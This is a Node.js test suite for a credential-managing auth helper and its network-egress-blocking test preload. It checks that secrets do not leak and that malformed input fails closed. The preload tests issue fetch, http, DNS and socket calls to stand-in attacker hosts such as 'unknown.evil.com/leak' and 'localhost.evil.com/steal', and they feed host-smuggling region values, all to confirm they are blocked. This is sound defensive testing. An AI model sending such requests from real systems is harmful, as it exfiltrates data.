import assert from "node:assert/strict";
import { mkdtemp, writeFile, readFile, mkdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawn } from "node:child_process";
import { createInterface } from "node:readline";
import { test } from "node:test";
import { parseRequest, parseResponse, projectCatalog, promptEvent, terminalResult } from "./protocol.mjs";


const DEFAULT_PRELOAD = join(import.meta.dirname, "test-preload-mock-fetch.mjs");

async function runHelper(input, env = {}) {
  const child = spawn(process.execPath, [join(import.meta.dirname, "index.mjs")], {
    env: {
      PATH: process.env.PATH,
      HOME: env.HOME,
      MECHA_PI_AUTH_PATH: env.authPath,
      MECHA_TEST_SENTINEL: "do-not-leak",
      MECHA_HOST_HOME: env.MECHA_HOST_HOME || env.HOME,
      GOOGLE_APPLICATION_CREDENTIALS: env.GOOGLE_APPLICATION_CREDENTIALS,
      CLOUDSDK_CONFIG: env.CLOUDSDK_CONFIG,
      NODE_OPTIONS: env.NODE_OPTIONS ?? `--import ${DEFAULT_PRELOAD}`,
      ...env.extraEnv,
    },
    stdio: ["pipe", "pipe", "pipe"],
  });
  child.stdin.end(input);
  let stdout = "";
  let stderr = "";
  for await (const chunk of child.stdout) stdout += chunk;
  for await (const chunk of child.stderr) stderr += chunk;
  const exitCode = await new Promise((resolve) => child.once("close", resolve));
  return { exitCode, stdout, stderr };
}

async function runHelperInteractive(initialLine, onPrompt, env = {}) {
  const child = spawn(process.execPath, [join(import.meta.dirname, "index.mjs")], {
    env: {
      PATH: process.env.PATH,
      HOME: env.HOME,
      MECHA_PI_AUTH_PATH: env.authPath,
      MECHA_TEST_SENTINEL: "do-not-leak",
      MECHA_HOST_HOME: env.MECHA_HOST_HOME || env.HOME,
      GOOGLE_APPLICATION_CREDENTIALS: env.GOOGLE_APPLICATION_CREDENTIALS,
      CLOUDSDK_CONFIG: env.CLOUDSDK_CONFIG,
      NODE_OPTIONS: env.NODE_OPTIONS ?? `--import ${DEFAULT_PRELOAD}`,
      ...env.extraEnv,
    },
    stdio: ["pipe", "pipe", "pipe"],
  });

  const rl = createInterface({ input: child.stdout, crlfDelay: Infinity });
  const events = [];
  let stderr = "";
  child.stderr.on("data", (chunk) => { stderr += chunk; });

  // Do NOT end stdin early; keep it open for interactive prompt-response turns
  child.stdin.write(initialLine.endsWith("\n") ? initialLine : `${initialLine}\n`);

  rl.on("line", async (line) => {
    try {
      const parsed = JSON.parse(line);
      events.push(parsed);
      if (parsed.type === "prompt" && onPrompt) {
        const val = await onPrompt(parsed);
        if (val !== undefined && !child.stdin.destroyed) {
          const resp = JSON.stringify({ type: "response", prompt_id: parsed.prompt.id, value: String(val) }) + "\n";
          child.stdin.write(resp);
        }
      }
      if (parsed.type === "terminal") {
        if (!child.stdin.destroyed) child.stdin.end();
      }
    } catch {
      // Non-JSON output handled via events
    }
  });

  const exitCode = await new Promise((resolve) => child.once("close", resolve));
  return { exitCode, events, stderr };
}


test("package root and required Cursor deep imports resolve from the lockfile", async () => {
  const packageJson = JSON.parse(await readFile(new URL("./package.json", import.meta.url), "utf8"));
  assert.deepEqual(packageJson.dependencies, {
    "@earendil-works/pi-coding-agent": "0.87.1",
    "@earendil-works/pi-ai": "0.87.1",
    "@earendil-works/pi-server": "0.87.1",
    "pi-cursor-sdk": "0.3.6",
  });
  assert.match(await import.meta.resolve("@earendil-works/pi-coding-agent"), /pi-coding-agent/);
  assert.match(await import.meta.resolve("pi-cursor-sdk/dist/index.js"), /pi-cursor-sdk/);
  assert.match(await import.meta.resolve("pi-cursor-sdk/dist/model-discovery.js"), /pi-cursor-sdk/);
});

test("catalog projection is deterministic, deduplicated, and excludes unavailable models", () => {
  assert.deepEqual(projectCatalog([
    { provider: "cursor", id: "two", name: "Two", available: true },
    { provider: "google", id: "one", name: "One", available: true },
    { provider: "google", id: "one", name: "duplicate", available: true },
    { provider: "google", id: "secret", name: "Secret", available: false },
  ]), {
    models: [
      { provider: "cursor", id: "two", name: "Two", available: true },
      { provider: "google", id: "one", name: "One", available: true },
    ],
  });
});

test("catalog projection enforces MAX_MODELS limit of 4096", () => {
  const models = Array.from({ length: 4096 }, (_, index) => ({
    provider: "cursor",
    id: `model-${index}`,
    name: `Model ${index}`,
    available: true,
  }));
  assert.equal(projectCatalog(models).models.length, 4096);
  assert.throws(() => {
    projectCatalog([...models, { provider: "cursor", id: "overflow", name: "Overflow", available: true }]);
  }, /model catalog is too large/);
});

test("an unsupported OpenAI API-key credential is never treated as ChatGPT subscription auth", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, JSON.stringify({ openai: { type: "api_key", key: "synthetic-test-key" } }), { mode: 0o600 });
  const result = await runHelper('{"operation":"models"}\n', { HOME: home, authPath });
  assert.equal(result.exitCode, 0);
  const catalog = JSON.parse(result.stdout);
  assert.equal(catalog.models.some((model) => model.provider === "openai"), false);
  assert.equal(result.stdout.includes("synthetic-test-key"), false);
});

test("ordinary Pi ChatGPT OAuth reports connected without exposing the fixture credential", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, JSON.stringify({ "openai-codex": { type: "oauth", access: "synthetic-access", refresh: "synthetic-refresh", expires: Date.now() + 60_000 } }), { mode: 0o600 });
  const result = await runHelper('{"operation":"models"}\n', { HOME: home, authPath });
  assert.equal(result.exitCode, 0);
  const snapshot = JSON.parse(result.stdout);
  assert.deepEqual(snapshot.providers.find((provider) => provider.provider === "openai-codex"), { provider: "openai-codex", label: "ChatGPT", authenticated: true, status: "authenticated" });
  assert.equal(result.stdout.includes("synthetic-access"), false);
  assert.equal(result.stdout.includes("synthetic-refresh"), false);
});

test("provider auth protocol binds each prompt and terminal snapshot to one mapped provider", () => {
  const request = parseRequest('{"operation":"login","operation_id":"operation-1","provider":"google"}');
  assert.deepEqual(parseResponse('{"type":"response","prompt_id":"prompt-1","value":"synthetic-key"}'), { type: "response", prompt_id: "prompt-1", value: "synthetic-key" });
  assert.deepEqual(promptEvent(request, { id: "prompt-1", kind: "secret", message: "Gemini API key" }), {
    type: "prompt", operation_id: "operation-1", provider: "google", prompt: { id: "prompt-1", kind: "secret", message: "Gemini API key" },
  });
  assert.deepEqual(promptEvent(request, { id: "prompt-2", kind: "manual_code", message: "Open the sign-in page", url: "https://accounts.google.com/device" }), {
    type: "prompt", operation_id: "operation-1", provider: "google", prompt: { id: "prompt-2", kind: "manual_code", message: "Open the sign-in page", url: "https://accounts.google.com/device" },
  });
  const terminal = terminalResult(request, "succeeded", {
    providers: [
      { provider: "openai-codex", label: "ChatGPT", authenticated: false, status: "signed_out" },
      { provider: "google", label: "Google", authenticated: true, status: "authenticated" },
      { provider: "cursor", label: "Cursor", authenticated: false, status: "signed_out" },
      { provider: "google-vertex", label: "Google Vertex AI", authenticated: false, status: "signed_out" },
    ],
    models: [{ provider: "google", id: "gemini-test", name: "Gemini test", available: true }],
  });
  assert.equal(terminal.operation_id, "operation-1");
  assert.equal(terminal.provider, "google");
  assert.equal(JSON.stringify(terminal).includes("synthetic-key"), false);
  assert.throws(() => parseRequest('{"operation":"login","operation_id":"operation-1","provider":"openai"}'));
  assert.throws(() => parseResponse('{"type":"response","prompt_id":"prompt-1","value":"x","extra":true}'));
});

test("a protected Cursor credential activates the pinned Cursor catalog adapter", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, JSON.stringify({ cursor: { type: "api_key", key: "synthetic-cursor-key" } }), { mode: 0o600 });
  const result = await runHelper('{"operation":"models"}\n', { HOME: home, authPath });
  assert.equal(result.exitCode, 0);
  const catalog = JSON.parse(result.stdout);
  assert.equal(catalog.models.some((model) => model.provider === "cursor"), true);
  assert.equal(result.stdout.includes("synthetic-cursor-key"), false);
});

test("one bounded JSONL request succeeds without leaking environment or credentials", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });
  const result = await runHelper('{"operation":"models"}\n', { HOME: home, authPath });
  assert.equal(result.exitCode, 0);
  assert.deepEqual(JSON.parse(result.stdout), {
    providers: [
      { provider: "openai-codex", label: "ChatGPT", authenticated: false, status: "signed_out" },
      { provider: "google", label: "Google", authenticated: false, status: "signed_out" },
      { provider: "cursor", label: "Cursor", authenticated: false, status: "signed_out" },
      { provider: "google-vertex", label: "Google Vertex AI", authenticated: false, status: "signed_out" },
    ],
    models: [],
  });
  assert.equal(result.stderr, "");
  assert.equal(result.stdout.includes("do-not-leak"), false);
});

test("unknown, malformed, oversized, and repeated requests fail with a safe result", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });
  for (const input of ["{}\n", "not-json\n", `${"x".repeat(65 * 1024)}\n`, "{\"operation\":\"models\",\"operation\":\"models\"}\n", "{\"operation\":\"models\"}\n{\"operation\":\"models\"}\n"]) {
    const result = await runHelper(input, { HOME: home, authPath });
    assert.equal(result.exitCode, 1);
    assert.deepEqual(JSON.parse(result.stdout), { error: "model catalog unavailable" });
    assert.equal(result.stdout.includes("do-not-leak"), false);
  }
});

test("invalid protected auth storage fails closed without exposing the parser error", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "not-json", { mode: 0o600 });
  const result = await runHelper('{"operation":"models"}\n', { HOME: home, authPath });
  assert.equal(result.exitCode, 1);
  assert.deepEqual(JSON.parse(result.stdout), { error: "model catalog unavailable" });
  assert.equal(result.stdout.includes("not-json"), false);
  assert.equal(result.stdout.includes(authPath), false);
});

test("Google API key login preserves GEMINI_API_KEY and exposes Gemini developer catalog", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });

  let promptCount = 0;
  const result = await runHelperInteractive(
    JSON.stringify({ operation: "login", operation_id: "op-google-1", provider: "google" }),
    async (event) => {
      promptCount++;
      assert.equal(event.prompt.kind, "secret");
      assert.match(event.prompt.message, /Gemini API key/i);
      return "synthetic-gemini-key-12345";
    },
    { HOME: home, authPath }
  );

  assert.equal(result.exitCode, 0);
  assert.equal(promptCount, 1);
  const terminal = result.events.find((e) => e.type === "terminal");
  assert.ok(terminal);
  assert.equal(terminal.status, "succeeded");
  assert.equal(terminal.provider, "google");
  const googleStatus = terminal.providers.find((p) => p.provider === "google");
  assert.ok(googleStatus);
  assert.equal(googleStatus.authenticated, true);
  assert.equal(googleStatus.status, "authenticated");
  assert.ok(terminal.models.some((m) => m.provider === "google"));
  for (const modelId of ["gemini-4-argon", "gemini-4-carbon", "gemini-4-hydrogen"]) {
    const m = terminal.models.find((m) => m.provider === "google" && m.id === modelId);
    assert.ok(m, `google model ${modelId} must be present`);
  }

  // Check auth.json contents
  const stored = JSON.parse(await readFile(authPath, "utf8"));
  assert.deepEqual(stored.google, { type: "api_key", key: "synthetic-gemini-key-12345" });
  assert.equal(JSON.stringify(result.events).includes("synthetic-gemini-key-12345"), false);
});

test("Google API key login rejects blank or whitespace key without mutating existing credentials", async () => {
  for (const blankInput of ["", "   ", "\t\n  "]) {
    const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
    const authPath = join(home, "auth.json");
    await writeFile(authPath, JSON.stringify({ google: { type: "api_key", key: "original-valid-key" } }), { mode: 0o600 });

    const result = await runHelperInteractive(
      JSON.stringify({ operation: "login", operation_id: "op-google-blank", provider: "google" }),
      async (event) => {
        return blankInput;
      },
      { HOME: home, authPath }
    );

    assert.equal(result.exitCode, 1);
    const terminal = result.events.find((e) => e.type === "terminal");
    assert.ok(terminal);
    assert.equal(terminal.status, "failed");
    assert.equal(terminal.providers, undefined);

    // Existing credential must remain intact, never mutated or emptied
    const stored = JSON.parse(await readFile(authPath, "utf8"));
    assert.deepEqual(stored.google, { type: "api_key", key: "original-valid-key" });
  }
});

test("Vertex AI ADC login rejects blank or whitespace project ID without mutating existing credentials", async () => {
  for (const blankProject of ["", "   ", "\t  "]) {
    const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
    const authPath = join(home, "auth.json");
    const hostHome = await mkdtemp(join(tmpdir(), "mecha-host-home-"));
    const gcloudDir = join(hostHome, ".config", "gcloud");
    await mkdir(gcloudDir, { recursive: true });
    const hostAdc = join(gcloudDir, "application_default_credentials.json");
    await writeFile(hostAdc, "{}");

    await writeFile(authPath, JSON.stringify({
      "google-vertex": {
        type: "api_key",
        env: {
          GOOGLE_CLOUD_PROJECT: "original-project",
          GOOGLE_CLOUD_LOCATION: "us-central1",
          GOOGLE_APPLICATION_CREDENTIALS: hostAdc,
        },
      },
    }), { mode: 0o600 });

    const result = await runHelperInteractive(
      JSON.stringify({ operation: "login", operation_id: "op-vertex-blank", provider: "google-vertex" }),
      async (event) => {
        if (event.prompt.placeholder === "my-gcp-project") {
          return blankProject;
        }
        return "us-central1";
      },
      { HOME: home, authPath, MECHA_HOST_HOME: hostHome }
    );

    assert.equal(result.exitCode, 1);
    const terminal = result.events.find((e) => e.type === "terminal");
    assert.ok(terminal);
    assert.equal(terminal.status, "failed");
    assert.equal(terminal.providers, undefined);

    // Existing credentials must not be overwritten or cleared
    const stored = JSON.parse(await readFile(authPath, "utf8"));
    assert.deepEqual(stored["google-vertex"].env.GOOGLE_CLOUD_PROJECT, "original-project");
  }
});


test("Vertex AI ADC login succeeds using host Application Default Credentials without prompting for API key", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });

  // Create synthetic ADC fixture on host home
  const hostHome = await mkdtemp(join(tmpdir(), "mecha-host-home-"));
  const gcloudDir = join(hostHome, ".config", "gcloud");
  await mkdir(gcloudDir, { recursive: true });
  const hostAdc = join(gcloudDir, "application_default_credentials.json");
  await writeFile(hostAdc, JSON.stringify({ client_id: "synthetic-adc-client", type: "authorized_user" }));

  const prompts = [];
  const result = await runHelperInteractive(
    JSON.stringify({ operation: "login", operation_id: "op-vertex-1", provider: "google-vertex" }),
    async (event) => {
      prompts.push(event.prompt);
      if (prompts.length === 1) return "synthetic-gcp-project-1";
      if (prompts.length === 2) return "us-east4";
      return "";
    },
    { HOME: home, authPath, MECHA_HOST_HOME: hostHome }
  );

  assert.equal(result.exitCode, 0);
  assert.equal(prompts.length, 2);
  // Verify helper did NOT prompt for an API key
  for (const p of prompts) {
    assert.notEqual(p.kind, "secret");
    assert.doesNotMatch(p.message, /API key/i);
  }

  const terminal = result.events.find((e) => e.type === "terminal");
  assert.ok(terminal);
  assert.equal(terminal.status, "succeeded");
  assert.equal(terminal.provider, "google-vertex");
  const vertexStatus = terminal.providers.find((p) => p.provider === "google-vertex");
  assert.ok(vertexStatus);
  assert.equal(vertexStatus.authenticated, true);
  assert.equal(vertexStatus.status, "authenticated");
  assert.ok(terminal.models.some((m) => m.provider === "google-vertex"));
  for (const modelId of ["gemini-4-argon", "gemini-4-carbon", "gemini-4-hydrogen"]) {
    const m = terminal.models.find((m) => m.provider === "google-vertex" && m.id === modelId);
    assert.ok(m, `google-vertex model ${modelId} must be present`);
  }

  const stored = JSON.parse(await readFile(authPath, "utf8"));
  assert.deepEqual(stored["google-vertex"], {
    type: "api_key",
    env: {
      GOOGLE_CLOUD_PROJECT: "synthetic-gcp-project-1",
      GOOGLE_CLOUD_LOCATION: "us-east4",
      GOOGLE_APPLICATION_CREDENTIALS: hostAdc,
    },
  });
});

test("Vertex AI ADC login prompts sequentially for Google Cloud Project ID and Region", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });

  const hostHome = await mkdtemp(join(tmpdir(), "mecha-host-home-"));
  const gcloudDir = join(hostHome, ".config", "gcloud");
  await mkdir(gcloudDir, { recursive: true });
  const hostAdc = join(gcloudDir, "application_default_credentials.json");
  await writeFile(hostAdc, "{}");

  const prompts = [];
  const result = await runHelperInteractive(
    JSON.stringify({ operation: "login", operation_id: "op-vertex-seq", provider: "google-vertex" }),
    async (event) => {
      prompts.push(event.prompt);
      if (prompts.length === 1) return "my-gcp-project";
      // Test default region fallback when empty string is provided
      if (prompts.length === 2) return "";
      return "";
    },
    { HOME: home, authPath, MECHA_HOST_HOME: hostHome }
  );

  assert.equal(result.exitCode, 0);
  assert.equal(prompts.length, 2);
  assert.match(prompts[0].message, /Project ID/i);
  assert.match(prompts[1].message, /Region/i);
  assert.equal(prompts[1].placeholder, "us-central1");

  const stored = JSON.parse(await readFile(authPath, "utf8"));
  assert.equal(stored["google-vertex"].env.GOOGLE_CLOUD_PROJECT, "my-gcp-project");
  assert.equal(stored["google-vertex"].env.GOOGLE_CLOUD_LOCATION, "us-central1");
});

test("Vertex AI ADC login rejects invalid region syntax without mutating existing credentials", async () => {
  const badRegions = [
    "attacker.invalid#",
    "evil.com/path",
    "us-central1?param=1",
    "user@evil.com",
    "host:8080",
    "foo\\bar",
    "us central1",
    "us%2fcentral1",
    "attacker.invalid",
    "-invalid-start",
    "invalid-end-",
    "a".repeat(64),
  ];

  for (const badRegion of badRegions) {
    const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
    const authPath = join(home, "auth.json");
    const hostHome = await mkdtemp(join(tmpdir(), "mecha-host-home-"));
    const gcloudDir = join(hostHome, ".config", "gcloud");
    await mkdir(gcloudDir, { recursive: true });
    const hostAdc = join(gcloudDir, "application_default_credentials.json");
    await writeFile(hostAdc, "{}");

    const initialCredentials = {
      google: { type: "api_key", key: "original-google-key" },
      antigravity: { type: "oauth", access: "original-ag-token", refresh: "original-ag-refresh", expires: Date.now() + 60000 },
      "google-vertex": {
        type: "api_key",
        env: {
          GOOGLE_CLOUD_PROJECT: "original-project",
          GOOGLE_CLOUD_LOCATION: "us-central1",
          GOOGLE_APPLICATION_CREDENTIALS: hostAdc,
        },
      },
    };
    await writeFile(authPath, JSON.stringify(initialCredentials), { mode: 0o600 });

    const result = await runHelperInteractive(
      JSON.stringify({ operation: "login", operation_id: "op-vertex-bad-region", provider: "google-vertex" }),
      async (event) => {
        if (event.prompt.placeholder === "my-gcp-project") return "new-project";
        return badRegion;
      },
      { HOME: home, authPath, MECHA_HOST_HOME: hostHome }
    );

    assert.equal(result.exitCode, 1, `badRegion "${badRegion}" should fail login`);
    const terminal = result.events.find((e) => e.type === "terminal");
    assert.ok(terminal);
    assert.equal(terminal.status, "failed");
    assert.match(terminal.error, /region/i);

    // Existing credentials must be preserved and NOT mutated
    const stored = JSON.parse(await readFile(authPath, "utf8"));
    assert.deepEqual(stored.google, initialCredentials.google);
    assert.deepEqual(stored.antigravity, initialCredentials.antigravity);
    assert.deepEqual(stored["google-vertex"], initialCredentials["google-vertex"]);
  }
});

test("Vertex AI ADC login accepts valid single host label regions including custom and global", async () => {
  const validRegions = [
    { input: "", expected: "us-central1" },
    { input: "   ", expected: "us-central1" },
    { input: "global", expected: "global" },
    { input: "us-central1", expected: "us-central1" },
    { input: "custom-region-42", expected: "custom-region-42" },
    { input: "  europe-west4  ", expected: "europe-west4" },
  ];

  for (const { input, expected } of validRegions) {
    const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
    const authPath = join(home, "auth.json");
    const hostHome = await mkdtemp(join(tmpdir(), "mecha-host-home-"));
    const gcloudDir = join(hostHome, ".config", "gcloud");
    await mkdir(gcloudDir, { recursive: true });
    const hostAdc = join(gcloudDir, "application_default_credentials.json");
    await writeFile(hostAdc, "{}");
    await writeFile(authPath, "{}", { mode: 0o600 });

    const result = await runHelperInteractive(
      JSON.stringify({ operation: "login", operation_id: "op-vertex-valid-region", provider: "google-vertex" }),
      async (event) => {
        if (event.prompt.placeholder === "my-gcp-project") return "valid-project";
        return input;
      },
      { HOME: home, authPath, MECHA_HOST_HOME: hostHome }
    );

    assert.equal(result.exitCode, 0, `validRegion "${input}" should succeed`);
    const terminal = result.events.find((e) => e.type === "terminal");
    assert.ok(terminal);
    assert.equal(terminal.status, "succeeded");
    const stored = JSON.parse(await readFile(authPath, "utf8"));
    assert.equal(stored["google-vertex"].env.GOOGLE_CLOUD_LOCATION, expected);
  }
});


test("Preload loopback predicate strictly allows loopback and denies evil lookalikes", async () => {
  const { isLoopbackHost, isAllowedLoopbackUrl } = await import("./test-preload-mock-fetch.mjs");

  // Valid loopback hosts
  assert.equal(isLoopbackHost("localhost"), true);
  assert.equal(isLoopbackHost("127.0.0.1"), true);
  assert.equal(isLoopbackHost("::1"), true);
  assert.equal(isLoopbackHost("[::1]"), true);
  assert.equal(isLoopbackHost("LOCALHOST"), true);

  // Evil lookalike hosts containing loopback substrings must be DENIED
  assert.equal(isLoopbackHost("localhost.evil"), false);
  assert.equal(isLoopbackHost("127.0.0.1.nip.io"), false);
  assert.equal(isLoopbackHost("127.0.0.1.evil.com"), false);
  assert.equal(isLoopbackHost("evil-localhost.com"), false);
  assert.equal(isLoopbackHost("localhost1"), false);
  assert.equal(isLoopbackHost("evil.127.0.0.1"), false);
  assert.equal(isLoopbackHost("example.com"), false);

  // URL predicate validation
  assert.equal(isAllowedLoopbackUrl("http://localhost:51121/oauth-callback"), true);
  assert.equal(isAllowedLoopbackUrl("http://127.0.0.1:8765/v1/health"), true);
  assert.equal(isAllowedLoopbackUrl("http://[::1]:3000/test"), true);
  assert.equal(isAllowedLoopbackUrl("http://localhost.evil:51121/steal"), false);
  assert.equal(isAllowedLoopbackUrl("http://127.0.0.1.evil:8765/steal"), false);
  assert.equal(isAllowedLoopbackUrl("ftp://localhost:21"), false);
  assert.equal(isAllowedLoopbackUrl("http://localhost:999999"), false);
  assert.equal(isAllowedLoopbackUrl("not-a-url"), false);
});

test("Preload egress denial blocks unmocked external requests and evil host lookalikes", async () => {
  const child = spawn(process.execPath, [
    "--import", DEFAULT_PRELOAD,
    "-e", `
      import assert from "node:assert/strict";
      import http from "node:http";

      // 1. Unmocked external fetch must fail
      let fetchBlocked = false;
      try {
        await fetch("https://unknown.evil.com/leak");
      } catch (err) {
        fetchBlocked = true;
      }
      assert.equal(fetchBlocked, true, "external fetch must be blocked");

      // 1b. Fetch with native Request object must fail
      let requestObjBlocked = false;
      try {
        await fetch(new Request("https://unknown.evil.com/request-obj", { method: "POST" }));
      } catch (err) {
        requestObjBlocked = true;
      }
      assert.equal(requestObjBlocked, true, "native Request object fetch must be blocked");

      // 2. Evil lookalike host with localhost substring must fail
      let evilBlocked = false;
      try {
        await fetch("https://localhost.evil.com/steal");
      } catch (err) {
        evilBlocked = true;
      }
      assert.equal(evilBlocked, true, "localhost lookalike fetch must be blocked");

      // 3. Evil lookalike host with 127.0.0.1 substring must fail
      let nipBlocked = false;
      try {
        await fetch("https://127.0.0.1.nip.io/steal");
      } catch (err) {
        nipBlocked = true;
      }
      assert.equal(nipBlocked, true, "127.0.0.1 lookalike fetch must be blocked");

      // 4. Standard node http.request to external destination must fail
      let httpBlocked = false;
      await new Promise((resolve) => {
        const req = http.request("http://unknown.evil.com/data", () => {});
        req.on("error", (err) => {
          assert.match(err.message, /EgressBlocked/);
          httpBlocked = true;
          resolve();
        });
      });
      assert.equal(httpBlocked, true, "node http.request must be blocked");

      // 5. Direct dns.lookup to external destination must fail before network query
      let dnsBlocked = false;
      import dns from "node:dns";
      await new Promise((resolve) => {
        dns.lookup("unknown.evil.com", (err) => {
          assert.ok(err);
          assert.match(err.message, /EgressBlocked/);
          dnsBlocked = true;
          resolve();
        });
      });
      assert.equal(dnsBlocked, true, "dns.lookup must be blocked");

      // 6. Direct net.connect to external destination must fail before TCP connection
      let netBlocked = false;
      import net from "node:net";
      await new Promise((resolve) => {
        const socket = net.connect({ host: "unknown.evil.com", port: 443 });
        socket.on("error", (err) => {
          assert.match(err.message, /EgressBlocked/);
          netBlocked = true;
          resolve();
        });
      });
      assert.equal(netBlocked, true, "net.connect must be blocked");
    `,
  ], {
    env: { PATH: process.env.PATH },
    stdio: ["pipe", "pipe", "pipe"],
  });

  let stderr = "";
  child.stderr.on("data", (d) => { stderr += d; });
  const exitCode = await new Promise((r) => child.once("close", r));
  assert.equal(exitCode, 0, `child failed with stderr: ${stderr}`);
});

test("Preload rejects non-loopback MECHA_TEST_ALLOW_HOSTS immediately", async () => {
  const child = spawn(process.execPath, [
    "--import", DEFAULT_PRELOAD,
    "-e", "console.log('should not run');",
  ], {
    env: { PATH: process.env.PATH, MECHA_TEST_ALLOW_HOSTS: "evil.com,localhost" },
    stdio: ["pipe", "pipe", "pipe"],
  });

  let stderr = "";
  child.stderr.on("data", (d) => { stderr += d; });
  const exitCode = await new Promise((r) => child.once("close", r));
  assert.equal(exitCode, 1);
  assert.match(stderr, /forbidden non-loopback host/i);
});

test("Preload exposes extensible MockAgent for runtime owner Vertex mocks without replacing dispatcher", async () => {
  const child = spawn(process.execPath, [
    "--import", DEFAULT_PRELOAD,
    "-e", `
      import assert from "node:assert/strict";
      const agent = globalThis.__MECHA_MOCK_AGENT__;
      assert.ok(agent, "globalThis.__MECHA_MOCK_AGENT__ must be exposed");

      // Verify that runtime owner can register Vertex stream mock on the existing agent
      const vertexClient = agent.get("https://us-central1-aiplatform.googleapis.com");
      vertexClient
        .intercept({
          path: "/v1/projects/test-proj/locations/us-central1/publishers/google/models/gemini-2.5-flash:streamGenerateContent",
          method: "POST",
        })
        .reply(200, "data: test-vertex-stream-chunk\\n\\n", {
          headers: { "content-type": "text/event-stream" },
        });

      const res = await fetch(
        "https://us-central1-aiplatform.googleapis.com/v1/projects/test-proj/locations/us-central1/publishers/google/models/gemini-2.5-flash:streamGenerateContent",
        { method: "POST" }
      );
      assert.equal(res.status, 200);
      assert.match(await res.text(), /test-vertex-stream-chunk/);

      // Verify that unmocked external requests remain strictly blocked
      let blocked = false;
      try {
        await fetch("https://us-central1-aiplatform.googleapis.com/v1/unmocked");
      } catch {
        blocked = true;
      }
      assert.equal(blocked, true, "unmocked endpoint on same host must still be blocked");
    `,
  ], {
    env: { PATH: process.env.PATH },
    stdio: ["pipe", "pipe", "pipe"],
  });

  let stderr = "";
  child.stderr.on("data", (d) => { stderr += d; });
  const exitCode = await new Promise((r) => child.once("close", r));
  assert.equal(exitCode, 0, `child failed with stderr: ${stderr}`);
});

test("Preload blocks external gaxios requests via node:https boundary", async () => {
  const child = spawn(process.execPath, [
    "--import", DEFAULT_PRELOAD,
    "-e", `
      import assert from "node:assert/strict";
      import { request } from "gaxios";

      let gaxiosBlocked = false;
      try {
        await request({ url: "https://evil.com/leak-test" });
      } catch (err) {
        assert.match(err.message, /EgressBlocked/);
        gaxiosBlocked = true;
      }
      assert.equal(gaxiosBlocked, true, "gaxios call to evil.com must be blocked by preload");
    `,
  ], {
    env: { PATH: process.env.PATH },
    stdio: ["pipe", "pipe", "pipe"],
  });

  let stderr = "";
  child.stderr.on("data", (d) => { stderr += d; });
  const exitCode = await new Promise((r) => child.once("close", r));
  assert.equal(exitCode, 0, `child failed with stderr: ${stderr}`);
});

test("Vertex AI ADC login resolves explicit GOOGLE_APPLICATION_CREDENTIALS", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });

  const customDir = await mkdtemp(join(tmpdir(), "mecha-custom-gac-"));
  const customAdc = join(customDir, "custom_application_default_credentials.json");
  await writeFile(customAdc, "{}");

  const result = await runHelperInteractive(
    JSON.stringify({ operation: "login", operation_id: "op-vertex-gac", provider: "google-vertex" }),
    async (event) => {
      if (event.prompt.placeholder === "my-gcp-project") return "custom-gac-project";
      return "us-west1";
    },
    { HOME: home, authPath, GOOGLE_APPLICATION_CREDENTIALS: customAdc }
  );

  assert.equal(result.exitCode, 0);
  const stored = JSON.parse(await readFile(authPath, "utf8"));
  assert.equal(stored["google-vertex"].env.GOOGLE_APPLICATION_CREDENTIALS, customAdc);
  assert.equal(stored["google-vertex"].env.GOOGLE_CLOUD_PROJECT, "custom-gac-project");
  assert.equal(stored["google-vertex"].env.GOOGLE_CLOUD_LOCATION, "us-west1");
});

test("Vertex AI ADC login resolves explicit CLOUDSDK_CONFIG", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });

  const customConfigDir = await mkdtemp(join(tmpdir(), "mecha-custom-config-"));
  const customAdc = join(customConfigDir, "application_default_credentials.json");
  await writeFile(customAdc, "{}");

  const result = await runHelperInteractive(
    JSON.stringify({ operation: "login", operation_id: "op-vertex-cloudsdk", provider: "google-vertex" }),
    async (event) => {
      if (event.prompt.placeholder === "my-gcp-project") return "cloudsdk-project";
      return "europe-west1";
    },
    { HOME: home, authPath, CLOUDSDK_CONFIG: customConfigDir }
  );

  assert.equal(result.exitCode, 0);
  const stored = JSON.parse(await readFile(authPath, "utf8"));
  assert.equal(stored["google-vertex"].env.GOOGLE_APPLICATION_CREDENTIALS, customAdc);
  assert.equal(stored["google-vertex"].env.GOOGLE_CLOUD_PROJECT, "cloudsdk-project");
  assert.equal(stored["google-vertex"].env.GOOGLE_CLOUD_LOCATION, "europe-west1");
});

test("Vertex AI ADC login fails with actionable error when ADC file is missing on host", async () => {
  const home = await mkdtemp(join(tmpdir(), "mecha-auth-helper-"));
  const authPath = join(home, "auth.json");
  await writeFile(authPath, "{}", { mode: 0o600 });

  const nonExistentAdc = "/tmp/does-not-exist-mecha-adc/application_default_credentials.json";

  const result = await runHelperInteractive(
